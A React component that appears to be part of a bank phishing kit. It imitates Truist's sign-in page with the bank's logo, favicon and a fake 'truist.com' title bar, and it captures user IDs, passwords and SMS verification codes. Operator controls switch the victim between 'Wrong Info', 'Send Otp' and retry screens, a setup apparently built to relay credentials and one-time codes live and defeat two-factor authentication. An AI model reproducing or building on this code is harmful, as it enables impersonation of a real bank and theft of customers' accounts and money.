import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import TruistFavIcon from "../../../../../../../../assets/allBanks/banks/truist/tst2.ico";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import TruistImg from "../../../../../../../../assets/allBanks/banks/truist/tst3.svg";
import { BsExclamationCircleFill } from "react-icons/bs";
import { otpOptions } from "../../bankDetails";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Truist = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-customPurple-500",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - truist.com"
        handleCancel={handleCancel}
        img={TruistFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="w-full bg-white">
        <div>
          <img
            src={TruistImg}
            alt=""
            className="w-[145px] h-[58px] object-contain"
          />
        </div>
      </header>
      <div className="items-center justify-center px-6 pt-24 pb-20  customMiniTablet:flex">
        <div
          className={clsx(
            " customMiniTablet:w-[374px] px-4 ",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div>
            <div className="mb-6">
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                placeholder="User ID"
                className={clsx(
                  "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600",
                  errorFormState.username ? "border border-customRed-900" : ""
                )}
              />
              {errorFormState.username && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                  <BsExclamationCircleFill className="mt-[2px]" />
                  Enter User ID
                </p>
              )}
              <div className="flex items-center justify-between mt-1.5">
                <div className="flex gap-2">
                  <input
                    type="checkbox"
                    className="w-[22px] h-[22px] border-white "
                  />
                  <p className="text-sm text-white">Save user ID</p>
                </div>
                <Link
                  className="underline text-customPurple-600 hover:no-underline"
                  to="https://www.truist.com/"
                >
                  {" "}
                  Forgot user ID?
                </Link>
              </div>
            </div>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={formState.password}
                name="password"
                onChange={handleChange}
                placeholder="Password"
                className={clsx(
                  "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600",
                  errorFormState.password ? "border border-customRed-900" : ""
                )}
              />
              <span
                onClick={() => setshowPassword((prevShow) => !prevShow)}
                className="absolute h-full py-4 right-4 "
              >
                {showPassword ? (
                  <FaRegEyeSlash size={16} />
                ) : (
                  <FaRegEye size={16} />
                )}
              </span>
              {errorFormState.password && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                  <BsExclamationCircleFill className="mt-[2px]" />
                  Enter Password{" "}
                </p>
              )}
              <Link
                className="float-right mt-1.5 underline text-customPurple-600 hover:no-underline"
                to="https://www.truist.com/"
              >
                Reset password
              </Link>
            </div>
            <button
              onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
              className="w-full py-2 mt-6 mb-2 text-lg font-semibold rounded-2xl text-customPurple-500 bg-customPurple-600 hover:bg-customPurple-700 transistion2"
            >
              {loading && <ClipLoader size={10} color="#2e1a47" />}
              {loading ? "Loading..." : "Sign in"}
            </button>
            <p className="font-semibold text-white mb-7">
              Need a user ID?{" "}
              <Link
                className="font-normal underline text-customPurple-600 hover:no-underline"
                to="https://www.truist.com/"
              >
                Set up online banking
              </Link>
            </p>
            <Link
              className="underline text-customPurple-600 hover:no-underline"
              to="https://www.truist.com/"
            >
              Online security measures
            </Link>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                      <BsExclamationCircleFill className="mt-[2px]" />

                      <p>{activePathDetails.body}</p>
                    </div>
                    <div className={clsx(" customMiniTablet:w-[374px] px-4 ")}>
                      <div>
                        <div className="mb-6">
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            placeholder="User ID"
                            className={clsx(
                              "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600",
                              errorFormState.username
                                ? "border border-customRed-900"
                                : ""
                            )}
                          />
                          {errorFormState.username && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              Enter User ID
                            </p>
                          )}
                          <div className="flex items-center justify-between mt-1.5">
                            <div className="flex gap-2">
                              <input
                                type="checkbox"
                                className="w-[22px] h-[22px] border-white "
                              />
                              <p className="text-sm text-white">Save user ID</p>
                            </div>
                            <Link
                              className="underline text-customPurple-600 hover:no-underline"
                              to="https://www.truist.com/"
                            >
                              {" "}
                              Forgot user ID?
                            </Link>
                          </div>
                        </div>
                        <div className="relative">
                          <input
                            type={showPassword ? "text" : "password"}
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                            placeholder="Password"
                            className={clsx(
                              "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600",
                              errorFormState.password
                                ? "border border-customRed-900"
                                : ""
                            )}
                          />
                          <span
                            onClick={() =>
                              setshowPassword((prevShow) => !prevShow)
                            }
                            className="absolute h-full py-4 right-4 "
                          >
                            {showPassword ? (
                              <FaRegEyeSlash size={16} />
                            ) : (
                              <FaRegEye size={16} />
                            )}
                          </span>
                          {errorFormState.password && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              Enter Password{" "}
                            </p>
                          )}
                          <Link
                            className="float-right mt-1.5 underline text-customPurple-600 hover:no-underline"
                            to="https://www.truist.com/"
                          >
                            Reset password
                          </Link>
                        </div>
                        <button
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className="w-full py-2 mt-6 mb-2 text-lg font-semibold rounded-2xl text-customPurple-500 bg-customPurple-600 hover:bg-customPurple-700 transistion2"
                        >
                          {loading && <ClipLoader size={10} color="#2e1a47" />}
                          {loading ? "Loading..." : "Sign in"}
                        </button>
                        <p className="font-semibold text-white mb-7">
                          Need a user ID?{" "}
                          <Link
                            className="font-normal underline text-customPurple-600 hover:no-underline"
                            to="https://www.truist.com/"
                          >
                            Set up online banking
                          </Link>
                        </p>
                        <Link
                          className="underline text-customPurple-600 hover:no-underline"
                          to="https://www.truist.com/"
                        >
                          Online security measures
                        </Link>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-2 mt-6 mb-2 text-lg font-semibold rounded-2xl text-customPurple-500 bg-customPurple-600 hover:bg-customPurple-700 transistion2"
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600 no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-900"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-900">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-2 mt-6 mb-6 text-lg font-semibold rounded-2xl text-customPurple-500 bg-customPurple-600 hover:bg-customPurple-700 transistion2"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#2e1a47" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your mobile
                              number
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full px-3 py-2 bg-white placeholder:text-customGray-1041 outline-1 outline-customGray-600 no-spinner",
                                    errorOtp.otpo
                                      ? "border border-customRed-900"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-900">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-2 mt-6 mb-6 text-lg font-semibold rounded-2xl text-customPurple-500 bg-customPurple-600 hover:bg-customPurple-700 transistion2"
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#2e1a47" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.truist.com/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </motion.div>
  );
};

export default Truist;
